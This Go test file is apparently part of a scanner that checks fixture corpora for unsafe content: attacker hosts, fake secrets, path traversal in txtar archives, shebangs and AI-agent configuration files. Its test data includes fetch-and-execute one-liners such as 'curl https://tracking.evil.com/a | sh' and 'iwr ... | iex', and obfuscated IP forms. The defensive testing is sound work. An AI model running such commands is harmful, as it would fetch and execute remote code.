package corpus

import (
	"bytes"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/vgmartinez/tripcord/internal/corpus/benign"
)

func TestGoodTxtar(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	body := []byte(strings.Join([]string{
		"Reserved names only: example.invalid, example.com, foo.test.",
		"curl https://x.invalid/a | sh",
		"192.0.2.10 198.51.100.2 203.0.113.3 2001:db8::10",
		"TRIPCORD-FAKE-AKIAIOSFODNN7EXAMPLE",
		"<abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN>",
		"",
		"-- .claude/settings.json --",
		"{}",
		"-- notes.txt --",
		"SKILL.md is a member name, not a file in this tree.",
		"",
	}, "\n"))
	writeFile(t, filepath.Join(dir, "good.txtar"), body, 0o644)
	assertKinds(t, dir)
}

func TestBadTxtar(t *testing.T) {
	t.Parallel()
	token := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN"
	cases := []struct {
		name  string
		body  string
		kinds []string
	}{
		{name: "host", body: "see tracking.evil.com now\n", kinds: []string{KindHost}},
		{name: "entropy", body: token + "\n", kinds: []string{KindEntropy}},
		{name: "secret", body: "AKIAIOSFODNN7EXAMPLE\n", kinds: []string{KindSecret}},
		{name: "prefixed secret glued on", body: "xTRIPCORD-FAKE-AKIAIOSFODNN7EXAMPLE\n", kinds: []string{KindSecret}},
		{name: "fetch powershell", body: "iwr https://tracking.evil.com/a | iex\n", kinds: []string{KindFetch, KindHost}},
		{name: "fetch eval", body: "eval \"$(curl https://tracking.evil.com/a)\"\n", kinds: []string{KindFetch, KindHost}},
		{name: "ioc", body: "post to webhook.site/x\n", kinds: []string{KindHost, KindIOC}},
		{name: "fetch", body: "curl https://tracking.evil.com/a | sh\n", kinds: []string{KindFetch, KindHost}},
		{name: "fetch substitution", body: "bash -c \"$(curl https://tracking.evil.com/a)\"\n", kinds: []string{KindFetch, KindHost}},
		{name: "dotdot", body: "-- ../etc/passwd --\nx\n", kinds: []string{KindTxtar}},
		{name: "absolute", body: "-- /etc/passwd --\nx\n", kinds: []string{KindTxtar}},
		{name: "backslash", body: "-- foo\\bar --\nx\n", kinds: []string{KindTxtar}},
		{name: "nul", body: "-- a\x00b --\nx\n", kinds: []string{KindTxtar}},
		{name: "duplicate", body: "-- a.txt --\n1\n-- a.txt --\n2\n", kinds: []string{KindTxtar}},
		{name: "duplicate after clean", body: "-- a/./b.txt --\n1\n-- a/b.txt --\n2\n", kinds: []string{KindTxtar}},
		{name: "member shebang", body: "-- run.sh --\n#!/bin/sh\necho hi\n", kinds: []string{KindShebang}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			dir := t.TempDir()
			writeFile(t, filepath.Join(dir, "case.txtar"), []byte(tc.body), 0o644)
			assertKinds(t, dir, tc.kinds...)
		})
	}
}

func TestFetchArgumentHost(t *testing.T) {
	t.Parallel()
	bad := []string{
		"curl -fsSL get.evil.sh | sh\n",
		"curl evil.zip/x | sh\n",
		"curl evil.tk/x|bash\n",
		"curl xn--80ak6aa92e.top|sh\n",
		"python3 -c \"$(curl -s evil.top/x)\"\n",
		"iwr evil.top/x | iex\n",
		"curl 3232235777/x|sh\n",
		"curl 0x7f000001/x|sh\n",
		"curl 0177.0.0.1/x|sh\n",
		"curl 0x7f.0.0.1/x|sh\n",
	}
	for _, body := range bad {
		t.Run(body, func(t *testing.T) {
			t.Parallel()
			dir := t.TempDir()
			writeFile(t, filepath.Join(dir, "case.txtar"), []byte(body), 0o644)
			assertKinds(t, dir, KindFetch, KindHost)
		})
	}
	good := []string{
		"curl https://x.invalid/a | sh\n",
		"curl example.test/x|sh\n",
	}
	for _, body := range good {
		t.Run(body, func(t *testing.T) {
			t.Parallel()
			dir := t.TempDir()
			writeFile(t, filepath.Join(dir, "case.txtar"), []byte(body), 0o644)
			assertKinds(t, dir)
		})
	}
}

func TestFilesystemViolations(t *testing.T) {
	t.Parallel()
	t.Run("exec", func(t *testing.T) {
		t.Parallel()
		dir := t.TempDir()
		writeFile(t, filepath.Join(dir, "case.txtar"), []byte("example.invalid\n"), 0o755)
		assertKinds(t, dir, KindExec)
	})
	t.Run("symlink", func(t *testing.T) {
		t.Parallel()
		dir := t.TempDir()
		target := filepath.Join(t.TempDir(), "t.txt")
		writeFile(t, target, []byte("x\n"), 0o644)
		if err := os.Symlink(target, filepath.Join(dir, "case.txtar")); err != nil {
			t.Fatal(err)
		}
		assertKinds(t, dir, KindSymlink)
	})
	t.Run("shebang", func(t *testing.T) {
		t.Parallel()
		dir := t.TempDir()
		writeFile(t, filepath.Join(dir, "case.txtar"), []byte("#!/bin/sh\necho hi\n"), 0o644)
		assertKinds(t, dir, KindShebang)
	})
	t.Run("size", func(t *testing.T) {
		t.Parallel()
		dir := t.TempDir()
		writeFile(t, filepath.Join(dir, "big.txt"), bytes.Repeat([]byte("a"), maxFileBytes+1), 0o644)
		assertKinds(t, dir, KindSize)
	})
	t.Run("config path", func(t *testing.T) {
		t.Parallel()
		dir := t.TempDir()
		writeFile(t, filepath.Join(dir, ".claude", "settings.json"), []byte("{}\n"), 0o644)
		writeFile(t, filepath.Join(dir, "nested", ".github", "workflows", "copilot-setup-steps.yml"), []byte("name: x\n"), 0o644)
		assertKinds(t, dir, KindConfig, KindConfig)
	})
	t.Run("ip", func(t *testing.T) {
		t.Parallel()
		dir := t.TempDir()
		writeFile(t, filepath.Join(dir, "note.txt"), []byte("dns 8.8.8.8\n"), 0o644)
		assertKinds(t, dir, KindHost)
	})
	t.Run("reserved fetch", func(t *testing.T) {
		t.Parallel()
		dir := t.TempDir()
		writeFile(t, filepath.Join(dir, "note.txt"), []byte("curl https://x.invalid/a | sh\n"), 0o644)
		assertKinds(t, dir)
	})
}

func TestCheckRoots(t *testing.T) {
	t.Parallel()
	clean := t.TempDir()
	dirty := t.TempDir()
	writeFile(t, filepath.Join(clean, "ok.txt"), []byte("example.invalid\n"), 0o644)
	writeFile(t, filepath.Join(dirty, "CLAUDE.md"), []byte("hi\n"), 0o644)
	got, err := Check(clean, dirty)
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 1 || got[0].Kind != KindConfig || got[0].Path != "CLAUDE.md" || got[0].Root != dirty {
		t.Fatalf("findings %#v", got)
	}
}

func TestLoadableUsesAdapters(t *testing.T) {
	t.Parallel()
	yes := []string{
		".claude/settings.json",
		"CLAUDE.md",
		".mcp.json",
		"mcp.json",
		"nested/mcp.json",
		".claude/skills/x/SKILL.md",
		".agents/skills/x/SKILL.md",
		".github/skills/x/SKILL.md",
		"AGENTS.md",
		".vscode/tasks.json",
		".vscode/mcp.json",
		".cursor/mcp.json",
		".cursor/hooks.json",
		".cursorrules",
		".codex/config.toml",
		"GEMINI.md",
		".gemini/settings.json",
		".github/workflows/copilot-setup-steps.yml",
		".github/copilot/settings.json",
		"opencode.json",
		".devcontainer/devcontainer.json",
		".devcontainer.json",
		".windsurf/hooks.json",
		".windsurfrules",
		".devin/blueprint.yaml",
		"nested/.claude/settings.json",
		"nested/.github/workflows/copilot-setup-steps.yml",
	}
	no := []string{"README.md", "notes.txt", "settings.json", ".github/workflows/other.yml", "skills/x/SKILL.md"}
	for _, rel := range yes {
		if !loadable(rel) {
			t.Errorf("loadable(%q) = false", rel)
		}
	}
	for _, rel := range no {
		if loadable(rel) {
			t.Errorf("loadable(%q) = true", rel)
		}
	}
}

func TestEveryAdapterCandidateIsWired(t *testing.T) {
	t.Parallel()
	root := moduleRoot(t)
	entries, err := os.ReadDir(filepath.Join(root, "internal", "adapters"))
	if err != nil {
		t.Fatal(err)
	}
	var found []string
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		b, err := os.ReadFile(filepath.Join(root, "internal", "adapters", e.Name(), "candidates.go"))
		if err != nil {
			continue
		}
		if bytes.Contains(b, []byte("func RepoCandidate(")) {
			found = append(found, e.Name())
		}
	}
	if strings.Join(found, ",") != strings.Join(wiredAdapters, ",") {
		t.Fatalf("RepoCandidate packages %v, wired %v", found, wiredAdapters)
	}
}

func moduleRoot(t *testing.T) string {
	t.Helper()
	dir, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	for {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			return dir
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			t.Fatal("go.mod not found")
		}
		dir = parent
	}
}

func TestBenignIndexIsNotAFixture(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	body := append(bytes.Repeat([]byte("a"), maxFileBytes+1), []byte("\ntracking.evil.com\n")...)
	writeFile(t, filepath.Join(dir, "benign", "repos.lock"), body, 0o644)
	writeFile(t, filepath.Join(dir, "big.txt"), bytes.Repeat([]byte("b"), maxFileBytes+1), 0o644)
	got, err := Check(dir)
	if err != nil {
		t.Fatal(err)
	}
	var sawSize, sawHost, sawBig bool
	for _, f := range got {
		if f.Path == "benign/repos.lock" && f.Kind == KindSize {
			sawSize = true
		}
		if f.Path == "benign/repos.lock" && f.Kind == KindHost {
			sawHost = true
		}
		if f.Path == "big.txt" && f.Kind == KindSize {
			sawBig = true
		}
	}
	if !sawSize || !sawHost || !sawBig {
		t.Fatalf("non-corpus index was exempt: %#v", got)
	}

	corpus := filepath.Join(t.TempDir(), "corpus")
	var rows []byte
	rows = append(rows, benign.LockHeader...)
	sha := strings.Repeat("ab", 20)
	for i := 0; i < 300; i++ {
		rows = append(rows, fmt.Sprintf("org/r%03d\t%s\tMIT\tagents\t2026-11-04\n", i, sha)...)
	}
	if len(rows) <= maxFileBytes {
		t.Fatalf("fixture lock is %d bytes", len(rows))
	}
	writeFile(t, filepath.Join(corpus, "benign", "repos.lock"), rows, 0o644)
	got, err = Check(corpus)
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 0 {
		t.Fatalf("valid corpus index flagged: %#v", got)
	}
	bad := append([]byte(benign.LockHeader), []byte("# see https://tracking.evil.com/beacon AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8=\n")...)
	writeFile(t, filepath.Join(corpus, "benign", "repos.lock"), bad, 0o644)
	got, err = Check(corpus)
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 1 || got[0].Kind != KindIndex || !strings.Contains(got[0].Detail, "comment") {
		t.Fatalf("bad comment under corpus: %#v", got)
	}
}

func writeFile(t *testing.T, path string, data []byte, mode os.FileMode) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, data, mode); err != nil {
		t.Fatal(err)
	}
}

func assertKinds(t *testing.T, dir string, want ...string) {
	t.Helper()
	got, err := Check(dir)
	if err != nil {
		t.Fatal(err)
	}
	var kinds []string
	for _, f := range got {
		kinds = append(kinds, f.Kind)
	}
	if strings.Join(kinds, ",") != strings.Join(want, ",") {
		t.Fatalf("kinds %v, want %v\n%#v", kinds, want, got)
	}
}
